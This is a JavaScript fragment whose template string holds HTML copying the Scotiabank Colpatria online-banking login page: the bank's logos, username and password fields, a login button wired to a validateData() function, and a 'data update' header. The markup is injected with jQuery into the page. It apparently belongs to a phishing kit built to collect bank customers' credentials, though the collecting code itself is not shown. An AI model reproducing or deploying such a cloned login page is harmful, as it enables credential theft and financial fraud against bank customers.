                                                d="M25 18.0000116C25 22.9763439 20.9651308 27 16 27c-4.9763387 0-9-4.034864-9-8.9999884C7 13.0236794 11.0348692 9 16 9c4.9651308-.0111847 9 4.0236794 9 9.0000116M72.9311663 27.3992395c1.7437859-.6730038 3.2695985-1.460076 4.623327-2.2357414-1.0669216.2965779-2.6042065.6844106-4.623327.9581749-1.1586998.1140684-2.4894837.3079848-3.8546845.3992395-5.667304.2851712-20.3173996-2.2471482-20.3173996-10.1749049 0-8.78327 15.705545-12.513308 24.1720841-13.4828897.7686425 0 1.4455067-.1026616 2.122371-.1026616 5.9770554-.3079848 13.4799235.285171 14.6386233.3764258C84.873805 1.174905 79.1950287 0 72.9311663 0 56.3652008 0 43 8.121673 43 18c0 5.0874525 3.4531549 9.6844106 9.1434034 13.0038023 5.7820268.3992395 15.7858509-1.9505704 15.7858509-1.9505704 1.8240918-.4904943 3.4646272-1.0608365 5.001912-1.6539924m0-2.3269962c.3785851 0 .7686425.0912548 1.1472276.0912548 1.4455067 0 2.8910134-.1939164 4.3365201-.5931559 2.8910133-2.1444867 4.4397705-4.5057034 4.4397705-6.5475285 0-3.7072243-4.3365201-6.6387833-9.9349904-7.0380228h-1.0554494c-1.4340344 0-2.9827915.1939163-4.33652.5931559-2.9827916 2.1558935-4.4282983 4.4942965-4.4282983 6.5475285.0229445 3.513308 4.3479923 6.5361217 9.8317399 6.946768M93.833652 5.121673c-5.7820268-.4904943-15.7858509 1.8593156-15.7858509 1.8593156-1.835564.4790874-3.5678776.9695817-5.1051625 1.6539924-1.7323136.6844106-3.2695984 1.4714829-4.5086042 2.3498099.9636711-.3764259 2.5927342-.6844107 4.5086042-.9695818 1.1472276-.21673 2.4894838-.4106464 3.9464627-.4106464 5.6787763-.285171 20.2370937 2.1558936 20.2370937 10.174905 0 8.6121673-15.6137667 12.4106464-24.1720841 13.2889734-.7801147.0912547-1.5372849.0912547-2.1223709.2053232-5.873805.3764258-13.3766731-.2053232-14.5353729-.296578C61 34.9277567 66.7820268 36 72.9541109 36 89.5200765 35.8973384 103 27.8897338 103 18.0114068c-.022945-5.0760456-3.5908222-9.5703422-9.166348-12.8897338">
                                            </path>
                                        </g>
                                    </svg></canvas-svg></span><span class="hide--xs"><canvas-svg
                                    name="scotiabank-colpatria-red" type="icon-logo" class="flex"><svg
                                        viewBox="0 0 284 25" xmlns="http://www.w3.org/2000/svg" focusable="false"
                                        role="presentation" aria-hidden="true"
                                        class="svg-icon svg-icon-logo--size-24px">
                                        <defs xmlns="http://www.w3.org/2000/svg">
                                            <style>
                                                #logo-scotibank-colpatria-red path {
                                                    fill: #ec111a;
                                                    stroke: none
                                                }
                                            </style>
                                        </defs>
                                        <g id="logo-scotibank-colpatria-red" fill="none" fill-rule="evenodd">
                                            <g id="left-container" fill="#FFF" fill-rule="nonzero">
                                                <g id="Group">
                                                    <path
                                                        d="M53.286455 17.0315315c-1.298836 0-2.3584127-1.0612612-2.3584127-2.3621621s1.0595767-2.3621622 2.3584127-2.3621622 2.3584127 1.0612613 2.3584127 2.3621622c0 1.3009009-1.0595767 2.3621621-2.3584127 2.3621621m0-7.736937c-2.9565608 0-5.3491534 2.4135136-5.3491534 5.3576578 0 2.9612612 2.4096825 5.3576576 5.3491534 5.3576576 2.9394709 0 5.3491535-2.4135135 5.3491535-5.3576576 0-2.9441442-2.4096826-5.3576577-5.3491535-5.3576577"
                                                        id="Shape"></path>
                                                    <path id="Path"
                                                        d="M65.4544974 9.5513513h-1.4526455V6.3846847h-3.2129101v3.1666666h-1.4526455v2.90991h1.4526455v7.309009h3.2129101v-7.309009h1.4526455">
                                                    </path>
                                                    <path id="Rectangle"
                                                        d="M66.9242328 9.5513513h3.1958201v10.2189189h-3.1958201z">
                                                    </path>
                                                    <path
                                                        d="M68.5306878 4.6045045c-.9912169 0-1.7773545.8045045-1.7773545 1.7801802s.8032275 1.7801802 1.7773545 1.7801802c.991217 0 1.7773545-.8045045 1.7773545-1.7801802s-.8032275-1.7801802-1.7773545-1.7801802M114.451376 12.3072072c1.059576 0 1.914074.8558559 1.914074 1.9171171v5.545946h3.19582v-5.990991c0-2.7216216-1.572275-4.4846847-4.050318-4.4846847-1.025396 0-2.084973.445045-2.97365 1.8828829V9.5513513h-3.195821v10.218919h3.195821v-5.545946c0-1.0612612.854497-1.9171171 1.914074-1.9171171M131.216614 19.7702703l-3.930688-5.1009009 3.657249-5.118018h-3.742699l-2.939471 4.1423423V4.8612613h-3.19582v14.909009h3.19582v-4.2108108l3.23 4.2108108M36.8971958 17.0144144c.2221693-.5477477.324709-1.1126126.324709-1.8828829 0-1.027027-.324709-1.9513513-.9057672-2.6018018-.6835979-.7531531-1.8457143-1.3693693-3.4692593-1.8486486-.3588889-.1027027-.649418-.2225225-.9057672-.3423424-.2905291-.1369369-.4956085-.3081081-.6835979-.5135135-.2050793-.2225225-.2905291-.4963964-.2905291-.8216216 0-.4792793.2563492-.8045045.666508-1.0612613.5126984-.3252252 1.5210053-.3594594 2.5293121.0171172.3588889.1369369.666508.2738738 1.0253969.4963964l1.3671957-2.7045045c-.5126984-.3081082-1.2304762-.7018018-1.9482539-.872973-.7348678-.1882883-1.4355556-.2738739-2.1704233-.2738739-.7519577 0-1.4355556.1198198-2.0337037.3423424-.5297884.2054054-1.0766667.5648648-1.5551852 1.0099099-.4272487.4108108-.8203175 1.0099099-1.0424868 1.5576576-.2221693.5648649-.3417989 1.1981982-.3417989 1.8828829 0 .7189189.3417989 1.9 1.2133862 2.7045045.9399471.872973 1.9824339 1.1810811 2.4096826 1.3522523.4272486.1711711.8886772.3081081 1.1962963.4279279.307619.1198198.6665079.290991.8715873.445045.2221693.1711712.3588888.3081081.4614285.5135135.1025397.2054054.1196297.3936937.1025397.6504505-.0341799.3423423-.1879894.6162162-.4614286.872973-.2734391.2567567-.7690476.4108108-1.4697354.4108108-.5810582 0-1.1962963-.1711712-1.7773545-.427928-.5297884-.2396396-.8886773-.445045-1.4526455-.7702702l-1.606455 2.7900901c1.1108465.9927928 2.9223809 1.6603603 4.5459259 1.6603603.8203174 0 1.6748148-.1369369 2.4096825-.3936937.6835979-.2396396 1.3671958-.6162162 1.8286244-1.027027.4956084-.4279279.9399471-1.0441441 1.1621164-1.5918919"
                                                        id="Path"></path>
                                                    <path
                                                        d="M133.472487 19.4108108c-.786138 0-1.418466-.6333333-1.418466-1.4207207s.632328-1.4207207 1.418466-1.4207207c.786137 0 1.418465.6333333 1.418465 1.4207207.01709.7873874-.632328 1.4207207-1.418465 1.4207207m0-3.218018c-.991217 0-1.777355.8045045-1.777355 1.7801802 0 .9927928.803228 1.7801802 1.777355 1.7801802.991217 0 1.777354-.8045046 1.777354-1.7801802.01709-.9756757-.786137-1.7801802-1.777354-1.7801802"
                                                        id="Shape"></path>
                                                    <path
                                                        d="M133.190132 17.9558559h.419501c.157313 0 .279668-.136937.279668-.3081082 0-.1711711-.122355-.2909909-.279668-.2909909h-.419501v.5990991zm.297147.3252252h-.297147v.6846847h-.367063v-1.9513514h.769085c.367064 0 .66421.290991.66421.6504505 0 .2396396-.157313.4621621-.384542.5648648l.419501.7360361h-.436981l-.367063-.6846847z"
                                                        id="Shape"></path>
                                                    <path
                                                        d="M45.6643386 16.1414414c-.4272487.5306307-1.0937566.8900901-1.8457143.8900901-1.2988359 0-2.3584127-1.0612612-2.3584127-2.3621621s1.0595768-2.3621622 2.3584127-2.3621622c.7348678 0 1.4013757.3423423 1.8457143.8900901l2.1191535-2.1225225c-.974127-1.0783784-2.3925926-1.763063-3.9648678-1.763063-2.9565608 0-5.5200529 2.1054053-5.5200529 5.3576576 0 3.2522522 2.5634921 5.3576576 5.5200529 5.3576576 1.5722752 0 2.9736508-.6846847 3.9648678-1.763063"
                                                        id="Path"></path>
                                                    <path
                                                        d="M77.0585714 17.0657658c-1.3330158 0-2.4096825-1.0783784-2.4096825-2.4135135 0-1.3351352 1.0766667-2.4135136 2.4096825-2.4135136 1.3330159 0 2.4096826 1.0783784 2.4096826 2.4135136 0 1.3351351-1.0937566 2.4135135-2.4096826 2.4135135zm5.5884127 2.7045045V9.5513513h-3.1103703v1.0783784l-.2905291-.2567567c-.7861376-.7018018-1.6577249-1.0783784-2.6831217-1.0783784-2.7514815 0-5.0757143 2.4477477-5.0757143 5.3576577 0 2.9099099 2.3242328 5.3576576 5.0757143 5.3576576 1.0253968 0 1.914074-.3765766 2.6831217-1.0783784l.2905291-.2567567v1.0783784h3.1103703v.0171171zM102.197884 17.0657658c-1.333016 0-2.4096829-1.0783784-2.4096829-2.4135135 0-1.3351352 1.0766669-2.4135136 2.4096829-2.4135136 1.333015 0 2.409682 1.0783784 2.409682 2.4135136 0 1.3351351-1.076667 2.4135135-2.409682 2.4135135zm5.605502 2.7045045V9.5513513h-3.12746v1.0783784l-.290529-.2567567c-.786138-.7018018-1.657725-1.0783784-2.683122-1.0783784-2.7514813 0-5.0757142 2.4477477-5.0757142 5.3576577 0 2.9099099 2.3242329 5.3576576 5.0757142 5.3576576 1.025397 0 1.914074-.3765766 2.683122-1.0783784l.290529-.2567567v1.0783784h3.12746v.0171171zM87.5005291 14.6522523c0-1.3351352 1.0766667-2.4135136 2.4096825-2.4135136 1.3330159 0 2.4096826 1.0783784 2.4096826 2.4135136 0 1.3351351-1.0766667 2.4135135-2.4096826 2.4135135-1.3330158 0-2.4096825-1.0783784-2.4096825-2.4135135zm-.0683598 5.118018v-1.0783784l.2905291.2567567c.7861376.7018019 1.6577249 1.0783784 2.6831217 1.0783784 2.7514815 0 5.0757143-2.4477477 5.0757143-5.3576576 0-2.9099099-2.3242328-5.3576577-5.0757143-5.3576577-1.0253968 0-1.9140741.3765766-2.6831217 1.0783784l-.2905291.2567567V4.8783784H84.304709v14.909009h3.1274603v-.0171171z"
                                                        id="Shape"></path>
                                                    <path
                                                        d="M18.0298942 4.6045045h-6.9556085c-3.9648677 0-7.2290476 2.9954955-7.6562963 6.8468469-.615238-1.1126127-.957037-2.3792793-.957037-3.7315316C2.4609524 3.4576577 5.9131217 0 10.1685185 0h11.9971429M4.1357672 20.027027h6.9556085c3.9648677 0 7.2290476-2.9954955 7.6562963-6.8468468.6152381 1.1126126.957037 2.3792793.957037 3.7315315 0 4.2621622-3.4521693 7.7198198-7.7075661 7.7198198H0"
                                                        id="Path"></path>
                                                    <path
                                                        d="M17.2608466 12.3072072c0 3.4234234-2.7685715 6.1963964-6.1865609 6.1963964-3.4179894 0-6.1865608-2.772973-6.1865608-6.1963964 0-3.4234234 2.7685714-6.1963964 6.1865608-6.1963964 3.4179894 0 6.1865609 2.772973 6.1865609 6.1963964"
                                                        id="Path"></path>
                                                    <path
                                                        d="M229.159101 12.136036c-.341799.0684685-.734868.0684685-1.076667.0684685h-.581058l.512698-3.1324324h1.145027c1.042486 0 1.845714.2738739 1.674814 1.5747747-.239259 1.0612613-.854497 1.3693694-1.674814 1.4891892m3.623068-5.1864865c-.683598-.3423423-1.538095-.445045-2.529312-.445045h-5.246614l-2.067883 12.4099099h3.452169l.700688-4.090991h2.067884c1.503915-.0684684 2.751481-.445045 3.623068-1.1639639.888678-.7018018 1.384286-1.6774775 1.623545-3.0468469.273439-1.9171171-.341799-3.063964-1.623545-3.663063"
                                                        id="Shape"></path>
                                                    <path id="Path"
                                                        d="M219.947619 6.5045045h-3.452169l-2.067884 12.1873874v.2225225h7.587937l.461428-2.7387387h-4.135767M200.482169 7.0522522l-.153809-.0513513c-.871588-.3594595-1.760265-.5135135-2.734392-.5135135-1.811534 0-3.725608.736036-5.144074 1.9342342-1.367196 1.1468469-2.290053 2.6873874-2.563492 4.3135135-.273439 1.7630631.10254 3.2693694 1.315926 4.4675676 1.093757 1.0954955 2.683122 1.7117117 4.426296 1.7117117 1.025397 0 1.862805-.2054054 3.007831-.5135135l.615238-3.6801802c-.820317.7702703-1.965344 1.2495496-3.0591 1.2495496-2.016614 0-3.178731-1.3522523-2.836932-3.218018.27344-1.8144145 1.862805-3.2693694 3.879418-3.2693694 1.093757 0 2.136244.4621621 2.631852 1.3009009l.495609-2.9612613">
                                                    </path>
                                                    <path
                                                        d="M210.701958 12.5468468c-.324709 1.7801802-1.828625 3.0981982-3.503439 3.3720721-.20508 0-.410159.0342343-.581059.0342343-1.879894 0-3.23-1.4207208-2.905291-3.4063064.22217-1.5405405 1.777355-2.8585585 3.48635-3.1324324h.495608c1.948254 0 3.29836 1.4891892 3.007831 3.1324324m-2.512223-6.0423423c-.324709 0-.666507 0-.991216.0342342-3.161641.3594595-6.220741 2.6018018-6.818889 5.7342343v.2054054c-.15381.8558558-.15381 1.6774775 0 2.4135135.546878 2.4477477 2.700211 4.0225225 5.759312 4.0225225.324709 0 .700688-.0342342 1.059577-.1027027 3.503439-.3936937 6.30619-2.9099099 6.853068-6.3333333v-.2567568c.03418-.4621621.03418-.9243243 0-1.318018-.324709-2.6702703-2.905291-4.3990991-5.861852-4.3990991"
                                                        id="Shape"></path>
                                                    <path
                                                        d="M178.914656 4.7585586c-3.486349-.290991-9.50201 1.0954955-9.50201 1.0954955-1.110847.290991-2.153334.5648648-3.076191.9756756-1.042487.3936937-1.982434.8558559-2.717302 1.3693694.581059-.2225225 1.572276-.3936937 2.717302-.5648649.683598-.1198198 1.503915-.2396396 2.375503-.2396396 3.417989-.1711712 12.185132 1.2666667 12.185132 5.9567568 0 5.0324324-9.399471 7.2747747-14.560635 7.7882882-.461429.0513514-.939947.0513514-1.281746.1198199-3.537619.2225225-8.049365-.1198199-8.750053-.1711712 2.836931 1.1468468 6.306191 1.7801802 10.031799 1.7801802 9.980529-.0513514 18.098254-4.7585586 18.098254-10.5441442 0-2.9954955-2.153333-5.6144144-5.520053-7.5657657M270.858571 6.5045045h-3.452169l-2.016614 12.4099099h3.45217l1.384285-8.6783784M254.742751 6.5045045h-9.074762l-.461428 2.7387387h2.819841l-1.555185 9.6711712h3.452169l1.555185-9.6711712h2.871112"
                                                        id="Path"></path>
                                                    <path
                                                        d="M275.688458 13.8517197l1.400906-2.7381664.617066-1.1758996.783841 3.914066h-2.801813zm4.486236-7.676945h-3.652363l-6.404144 11.1038525-.550356 1.0583097h3.585653l1.234132-2.0830222h4.602978l.500324 2.0830222h3.568976l-2.8852-12.1621621zM259.869735 11.9135135c-.393068.1027027-.803227.1540541-1.162116.1540541h-.341799l.512699-3.0981982h.974127c.854497.1027027 1.606455.445045 1.503915 1.5234234-.15381.8900901-.786138 1.2666667-1.486826 1.4207207m5.075715-1.5747748c.461428-2.6873874-1.315926-3.8342342-3.964868-3.8342342h-5.126984l-1.606455 9.4657658-.478519 2.9441441h3.46926l.803227-4.7585585 1.845714 3.4918918.632328 1.2666667h4.323757l-3.36672-5.0837838c1.965344-.3252252 3.23-1.8144144 3.46926-3.4918919M237.447725 14.327027l1.435555-2.7900901.632328-1.1981982.803228 3.9882883h-2.871111zm4.665555-7.8225225h-3.776878l-5.537143 9.5171171-1.606455 2.8927928h3.691429l1.264656-2.1225225h4.716825l.512699 2.1225225h3.691428L242.11328 6.5045045z"
                                                        id="Shape"></path>
                                                    <path
                                                        d="M166.336455 16.4495495c.222169 0 .461429.0513514.683598.0513514.871587 0 1.743175-.1198198 2.614762-.3423423 1.743174-1.2495496 2.683122-2.6360361 2.683122-3.8342343 0-2.1738738-2.614762-3.8855856-5.981482-4.1252252h-.632328c-.871587 0-1.794444.1198198-2.597672.3423423-1.794444 1.2666667-2.666115 2.6360361-2.666115 3.8342343-.017007 2.054054 2.597755 3.8342342 5.896115 4.0738738"
                                                        id="Path"></path>
                                                    <path
                                                        d="M166.336455 17.8018018c1.042487-.3936937 1.965344-.8558559 2.785661-1.318018-.632328.1711712-1.572275.3936937-2.785661.5648648-.700688.0684685-1.503915.1882883-2.324233.2396397-3.417989.1711712-12.236402-1.318018-12.236402-5.9567568 0-5.1522522 9.450741-7.326126 14.560635-7.890991.461429 0 .871587-.0513513 1.281746-.0513513 3.605979-.1711712 8.117725.1711712 8.818413.2225225-2.905291-1.1468468-6.323281-1.8315315-10.100159-1.8315315-9.980529 0-18.029894 4.7585585-18.029894 10.5441441 0 2.9783784 2.084973 5.6657658 5.502963 7.6171171 3.486349.2225226 9.50201-1.1468468 9.50201-1.1468468 1.110847-.3081081 2.102064-.6333333 3.024921-.9927928"
                                                        id="Path"></path>
                                                </g>
                                            </g>
                                        </g>
                                    </svg></canvas-svg></span>
                            <div class="divider"></div><span class="text--introduction truncate">Actualizacion de
                                datos</span>
                        </div>
                    </div>
                    <div class="col-xs-1 col-sm-1 col-md-1 header__action header__action--center"><canvas-svg size="18"
                            name="close" color="default" class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24"
                                height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"
                                class="svg-icon svg-icon--size-18px svg-icon--color-default">
                                <path fill="none" d="M2.72 2.66l18.62 18.62m0-18.62L2.72 21.28"></path>
                            </svg></canvas-svg></div>
                </div>
            </div>
        </header>
    </canvas-header>
</header>
<div class="application-wrapper">
    <canvas-header shadow="" fixed="" class="header__block">
        <header class="header" id="header">
            <div class="header__bar container container--center direction--row">
                <a routerlink="/" class="brand block block--centered" href="/banca-virtual/login/">
                    <img src="https://cdn.agilitycms.com/scotiabank-colombia/canvas/svgs/logos/scotiabank-colpatria-red.svg" alt="Scotiabank Colpatria" class="logo">
                    <img src="https://cdn.agilitycms.com/scotiabank-colombia/canvas/svgs/logos/scotiabank-colpatria-symbol-red.svg" alt="Scotiabank Colpatria" class="logo__mobile"></a>
            </div>
        </header>
    </canvas-header>
    <section role="main" class="container main-container">
        <auth-login>
            <div class="col-xs-12 block--padding-0 margin-xs-72--bottom">
                <div class="direction--row">
                    <div class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0 m-auto">
                        <h1 class="hero">Ingresa a tu Banca Virtual</h1>
                        <form onsubmit="return false" novalidate="" role="form" autocomplete="off" class="form ng-pristine ng-invalid ng-touched"><!----><!---->
                            <div class="form__input margin-xs-30--top">
                                <canvas-input-text formcontrolname="firstCredential" _nghost-hjw-c48="" class="ng-pristine ng-invalid ng-touched" maxlength="12">
                                    <div class="form__input">
                                        <label role="text" class="label" for="inputUserNameId"></label>
                                        <div class="form__input--inline">
                                            <input required class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" id="txtUsuario" type="text" placeholder="Nombre de usuario" autocomplete="off" aria-describedby="first-credential-input-error" maxlength="12">
                                            <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                    <path fill="#333" stroke-linecap="round" stroke-width="0.5" stroke-linejoin="round" d="M22.879 22.129a.75.75 0 1 1-1.5 0v-2.39c0-2.212-1.979-4.031-4.449-4.031H6.532c-2.47 0-4.449 1.82-4.449 4.03v2.39a.75.75 0 1 1-1.5 0v-2.39c0-3.069 2.677-5.53 5.95-5.53H16.93c3.272 0 5.949 2.461 5.949 5.53v2.39zm-10.79-10.006a5.77 5.77 0 1 1 0-11.54 5.77 5.77 0 0 1 0 11.54zm0-1.5a4.27 4.27 0 1 0 0-8.54 4.27 4.27 0 0 0 0 8.54z"></path>
                                                </svg>
                                            </canvas-svg>
                                            <div type="button" class="button input-w-aux__action">
                                                <canvas-svg role="presentation" class="flex">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                        <path fill="none" d="M22.667 12c0 5.891-4.776 10.667-10.667 10.667C6.108 22.667 1.333 17.89 1.333 12S6.108 1.333 12 1.333c5.89 0 10.667 4.776 10.667 10.667zM8.647 8.648l6.705 6.704m0-6.704l-6.704 6.704"></path>
                                                    </svg>
                                                </canvas-svg>
                                            </div>
                                        </div>
                                    </div>
                                </canvas-input-text>
                                <span id="first-credential-input-error"><!----></span>
                            </div>
                            <div class="margin-xs-24--top form__password">
                                <canvas-input-text formcontrolname="secondCredential" _nghost-hjw-c48="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                                    <div class="form__input">
                                        <label role="text" class="label" for="inputPswdId"></label>
                                        <div class="form__input--inline">
                                            <input required class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" id="txtPassword" type="password" placeholder="Contraseña" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="15">
                                            <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                    <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                                    <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                                    <path fill="none" d="M12.104 14.582v2.695"></path>
                                                    <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                                                </svg>
                                            </canvas-svg>
                                            <button id="showPass" type="button" class="button input-w-aux__action">
                                                <canvas-svg role="presentation" class="flex">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                        <g fill="none">
                                                            <path d="M1.333 11.933c0 1.451 3.43 7.334 10.667 7.334 1.686 0 3.165-.32 4.442-.827 4.206-1.673 6.225-5.394 6.225-6.507 0-1.45-3.43-7.333-10.667-7.333-7.236 0-10.667 5.882-10.667 7.333z"></path>
                                                            <path d="M12 8.267c-2.076 0-3.765 1.645-3.765 3.666 0 2.022 1.69 3.667 3.765 3.667 2.076 0 3.765-1.645 3.765-3.667 0-2.021-1.69-3.666-3.765-3.666"></path>
                                                        </g>
                                                    </svg>
                                                </canvas-svg>
                                            </button>
                                        </div>
                                    </div>
                                </canvas-input-text>
                                <div class="password-validation">
                                    <span> 8+ caracteres </span>
                                    <span> 1+ mayúscula </span>
                                    <span> 1+ minúscula </span>
                                    <span> 1+ número </span>
                                </div>
                            </div>
                            <div class="margin-xs-18--top">
                                <a class="link link__text" id="linkHelpId" href="#">¿Necesitas ayuda para ingresar?</a>
                            </div>
                            <div class="margin-xs-36--top">
                                <canvas-input-checkbox formcontrolname="rememberUser" class="ng-untouched ng-pristine ng-valid">
                                    <label class="form__input form__input--inline form__input--checkbox" for="checkRememberUserId">
                                        <input type="checkbox" class="input input--checkbox ng-untouched ng-pristine ng-valid" id="checkRememberUserId">
                                        <span class="checkbox">
                                            <svg focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24" class="svg-icon svg-icon--size-12px checkbox__check">
                                                <path stroke="none" d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"></path>
                                            </svg>
                                        </span>
                                        <div class="label label--inline label--checkbox"> Recordar mi nombre de usuario</div>
                                    </label>
                                </canvas-input-checkbox>
                            </div>
                            <div class="margin-xs-24--top">
                                <canvas-button width="100%">
                                    <button class="button button--primary" onclick="validateData()" id="btnUsuario" style="width: 100%;">
                                        <span>Ingresar</span>
                                    </button>
                                </canvas-button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </auth-login>
    </section>
    <footer class="hide--xs"><canvas-co-footer-simple>
            <div class="footer-simple--co background--background-alternate">
                <div class="container container--center">
                    <div class="direction--row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            <div class="margin-xs-12 margin-sm-18">
                                <p class="text--roman text--footer color--default"><span text=""> © 2023 Todos los Derechos Reservados <br class="hide--sm hide--md hide--lg"> Scotiabank Colpatria. </span><!----><!----></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </canvas-co-footer-simple>
    </footer>
</div>
`
//<script>
    loadContenido();
    $('auth-login').html(colpatria_contenido);